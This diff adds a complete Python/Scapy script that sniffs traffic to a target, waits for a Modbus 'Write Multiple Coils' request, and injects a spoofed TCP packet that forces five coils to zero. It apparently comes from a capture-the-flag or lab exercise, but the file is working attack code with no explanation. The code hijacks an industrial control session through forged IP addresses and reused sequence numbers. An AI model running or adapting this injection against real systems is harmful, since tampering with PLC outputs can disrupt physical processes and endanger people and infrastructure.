@@ -1,0 +1,72 @@
+from scapy.all import *
+import sys
+
+# Define custom Modbus TCP protocol class
+class ModbusTCP(Packet):
+    name = "ModbusTCP"
+    fields_desc = [
+        ShortField("transaction_id", 1337),  # Using 1337
+        ShortField("protocol_id", 0),
+        ShortField("length", 7),  # Length of remaining bytes
+        ByteField("unit_id", 1)
+    ]
+
+# Define custom Modbus protocol class
+class Modbus(Packet):
+    name = "Modbus"
+    fields_desc = [
+        ByteField("function_code", 15),  # 15 (0x0f) for Write Multiple Coils
+        ShortField("reference_number", 0),
+        ShortField("bit_count", 5),
+        ByteField("byte_count", 1),
+        ByteField("data", 0)  # Set all outputs to 0
+    ]
+
+def sniff_and_inject(target_ip):
+    print(f"[*] Starting packet sniffing targeting {target_ip}")
+    
+    while True:
+        # Sniff 4 packets (2x needed amount to prevent aliasing)
+        packets = sniff(
+            count=4,
+            lfilter=lambda pkt: TCP in pkt and pkt[IP].dst == target_ip
+        )
+        
+        # Check if penultimate packet is a Write Coils query
+        if len(packets) >= 2 and Raw in packets[-2] and b"\x0f\x00\x00\x00\x05\x01" in raw(packets[-2][Raw]):
+            seed_pkt = packets[-2]
+            print("[+] Found Write Coils query packet to use as seed")
+            break
+    
+    print("[*] Crafting malicious packet")
+    
+    # Create IP layer
+    ip = IP(
+        src=seed_pkt[IP].dst,  # Spoof source as target
+        dst=seed_pkt[IP].src   # Send to original source
+    )
+    
+    # Create TCP layer
+    tcp = TCP(
+        sport=seed_pkt[TCP].dport,
+        dport=seed_pkt[TCP].sport,
+        seq=seed_pkt[TCP].ack,
+        ack=seed_pkt[TCP].seq,
+        flags="PA"  # Push + ACK flags
+    )
+    
+    # Create full packet with all layers
+    packet = ip / tcp / ModbusTCP() / Modbus()
+    
+    print("[*] Injecting malicious packet")
+    # Send the packet
+    send(packet)
+    print("[+] Packet injection completed")
+
+if __name__ == "__main__":
+    if len(sys.argv) != 2:
+        print(f"Usage: {sys.argv[0]} <target_ip>")
+        sys.exit(1)
+        
+    target_ip = sys.argv[1]
+    sniff_and_inject(target_ip)
